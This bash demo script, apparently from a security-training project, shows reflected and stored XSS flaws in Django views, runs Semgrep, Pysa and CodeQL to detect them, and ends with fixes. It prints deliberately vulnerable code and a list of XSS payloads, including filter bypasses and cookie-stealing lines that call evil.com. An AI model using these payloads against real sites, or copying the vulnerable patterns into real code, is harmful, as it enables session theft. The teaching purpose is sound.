#!/bin/bash
# =============================================================================
# Demo 4: Cross-Site Scripting (XSS) Detection
# =============================================================================
# This demo shows how each tool detects XSS vulnerabilities in VulnShop
# Run from the project root directory
# =============================================================================

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${BLUE}=============================================${NC}"
echo -e "${BLUE}  Cross-Site Scripting (XSS) Detection Demo${NC}"
echo -e "${BLUE}=============================================${NC}"
echo ""

# -----------------------------------------------------------------------------
# Step 1: Types of XSS
# -----------------------------------------------------------------------------
echo -e "${YELLOW}Step 1: Types of XSS Vulnerabilities${NC}"
echo ""

cat << 'EOF'
┌─────────────────────────────────────────────────────────────────────────┐
│                          XSS Types                                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. Reflected XSS                                                        │
│     └── User input immediately reflected in response                     │
│     └── Example: Search results displaying search term                   │
│                                                                          │
│  2. Stored XSS                                                           │
│     └── Malicious input stored and displayed to other users             │
│     └── Example: Comment containing <script> tag                        │
│                                                                          │
│  3. DOM-based XSS                                                        │
│     └── Vulnerability in client-side JavaScript                         │
│     └── Example: document.write(location.hash)                          │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 2: Reflected XSS - Vulnerable Code
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 2: Reflected XSS - The Vulnerable Code${NC}"
echo -e "File: vulnerable-app/catalog/views.py"
echo ""

cat << 'EOF'
def search_products(request):
    """Search products - VULNERABLE to Reflected XSS"""
    query = request.GET.get('q', '')  # SOURCE: User input

    products = Product.objects.filter(name__icontains=query)

    # VULNERABLE: Query reflected without escaping
    html = f"""
    <h1>Search Results for: {query}</h1>  <!-- SINK: Unescaped output -->
    <div class="results">
        {render_products(products)}
    </div>
    """
    return HttpResponse(html)
EOF

echo ""
echo -e "${RED}Attack: ?q=<script>alert(document.cookie)</script>${NC}"
echo -e "${RED}Result: JavaScript executes in victim's browser!${NC}"
echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 3: Stored XSS - Vulnerable Code
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 3: Stored XSS - The Vulnerable Code${NC}"
echo -e "File: vulnerable-app/reviews/views.py"
echo ""

cat << 'EOF'
def submit_review(request, product_id):
    """Submit product review - VULNERABLE to Stored XSS"""
    if request.method == 'POST':
        content = request.POST.get('review')  # SOURCE: User input

        # Content stored without sanitization
        Review.objects.create(
            product_id=product_id,
            user=request.user,
            content=content  # Stored as-is
        )

def display_reviews(request, product_id):
    reviews = Review.objects.filter(product_id=product_id)

    # VULNERABLE: Content rendered without escaping
    html = ""
    for review in reviews:
        html += f"<div class='review'>{review.content}</div>"  # SINK

    return HttpResponse(html)
EOF

echo ""
echo -e "${RED}Attack: Review content = <img src=x onerror='fetch(\"http://evil.com/steal?\"+document.cookie)'>${NC}"
echo -e "${RED}Result: Every user viewing the product has cookies stolen!${NC}"
echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 4: Semgrep Detection
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 4: Semgrep Detection (~5 seconds)${NC}"
echo ""

cd analysis/semgrep
echo "Running: semgrep --config rules/injection/xss.yml"
echo ""

time semgrep --config rules/injection/ ../../vulnerable-app/catalog/ ../../vulnerable-app/reviews/ 2>/dev/null || true

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 5: Pysa Detection
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 5: Pysa Detection${NC}"
echo ""

cd ../pysa
echo "Running: pyre analyze (filtered for XSS)"
echo ""

cat << 'EOF'
[Expected Pysa Output]

Issue: Cross-Site Scripting (code 5004)
  File: catalog/views.py
  Line: 15
  Message: User-controlled data flows to HTML response

  Trace (Reflected XSS):
    Source: request.GET.get('q') [UserControlled]
      ↓ f-string interpolation
    Sink: HttpResponse(html) [XSS]

Issue: Cross-Site Scripting (code 5004)
  File: reviews/views.py
  Line: 28
  Message: Stored user data flows to HTML response

  Trace (Stored XSS):
    Source: Review.content [UserControlled via database]
      ↓ f-string interpolation
    Sink: HttpResponse(html) [XSS]
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 6: CodeQL Detection
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 6: CodeQL Detection${NC}"
echo ""

cd ../codeql
echo "Running: codeql database analyze --queries=xss.ql"
echo ""

cat << 'EOF'
[Expected CodeQL Output]

reflected-xss.ql: Reflected Cross-Site Scripting
  Path: catalog/views.py:15

  Source: request.GET.get('q')
    ↓ string formatting
  Sink: HttpResponse(html)

  CWE: CWE-79 (Cross-site Scripting)
  Severity: error

stored-xss.ql: Stored Cross-Site Scripting
  Path: reviews/views.py:28

  Source: Review.content (database field)
    ↓ string formatting
  Sink: HttpResponse(html)

  Note: Stored XSS has higher impact as it affects all users
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 7: XSS Payloads
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 7: Common XSS Payloads${NC}"
echo ""

cat << 'EOF'
Basic Payloads:
  <script>alert('XSS')</script>
  <img src=x onerror=alert('XSS')>
  <svg onload=alert('XSS')>

Filter Bypass:
  <ScRiPt>alert('XSS')</ScRiPt>
  <script>alert(String.fromCharCode(88,83,83))</script>
  <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;('XSS')">

Attribute Injection:
  " onmouseover="alert('XSS')
  ' onfocus='alert(1)' autofocus='

Template Injection (in JS context):
  </script><script>alert('XSS')</script>
  '-alert('XSS')-'

Data Exfiltration:
  <script>new Image().src='http://evil.com/steal?c='+document.cookie</script>
  <script>fetch('http://evil.com/log?d='+btoa(document.body.innerHTML))</script>
EOF

echo ""
read -p "Press Enter to continue..."

# -----------------------------------------------------------------------------
# Step 8: Comparison
# -----------------------------------------------------------------------------
echo ""
echo -e "${YELLOW}Step 8: Detection Comparison${NC}"
echo ""

echo -e "┌─────────────┬──────────────┬────────────┬─────────────────┐"
echo -e "│ Tool        │ Reflected    │ Stored     │ DOM-based       │"
echo -e "├─────────────┼──────────────┼────────────┼─────────────────┤"
echo -e "│ Semgrep     │ ${GREEN}✅${NC}           │ ${GREEN}✅${NC}         │ ${YELLOW}⚠️ Limited${NC}     │"
echo -e "│ Pysa        │ ${GREEN}✅${NC}           │ ${GREEN}✅${NC}         │ ${RED}❌ No${NC}          │"
echo -e "│ CodeQL      │ ${GREEN}✅${NC}           │ ${GREEN}✅${NC}         │ ${GREEN}✅ (JS queries)${NC}│"
echo -e "└─────────────┴──────────────┴────────────┴─────────────────┘"

echo ""
echo -e "${CYAN}Note: DOM-based XSS requires JavaScript analysis.${NC}"
echo -e "${CYAN}      CodeQL has JavaScript support; Pysa is Python-only.${NC}"
echo ""

# -----------------------------------------------------------------------------
# Step 9: The Fix
# -----------------------------------------------------------------------------
echo -e "${YELLOW}Step 9: The Fix${NC}"
echo ""

cat << 'EOF'
# SAFE: Using Django's built-in escaping and templates

# Option 1: Use Django templates with auto-escaping
from django.shortcuts import render

def search_products(request):
    query = request.GET.get('q', '')
    products = Product.objects.filter(name__icontains=query)

    # Templates auto-escape by default
    return render(request, 'search_results.html', {
        'query': query,
        'products': products
    })

# Option 2: Explicit escaping
from django.utils.html import escape

def search_products_manual(request):
    query = request.GET.get('q', '')
    safe_query = escape(query)  # Escapes < > & " '

    html = f"<h1>Search Results for: {safe_query}</h1>"
    return HttpResponse(html)

# Option 3: Content Security Policy (defense in depth)
def search_with_csp(request):
    response = render(request, 'search.html', {'query': query})
    response['Content-Security-Policy'] = "script-src 'self'"
    return response

# For rich text: Use a sanitization library
import bleach

def submit_review(request, product_id):
    content = request.POST.get('review')

    # Allow only safe HTML tags
    safe_content = bleach.clean(
        content,
        tags=['p', 'br', 'strong', 'em'],
        strip=True
    )

    Review.objects.create(
        product_id=product_id,
        content=safe_content
    )
EOF

echo ""
echo -e "${GREEN}Demo Complete!${NC}"
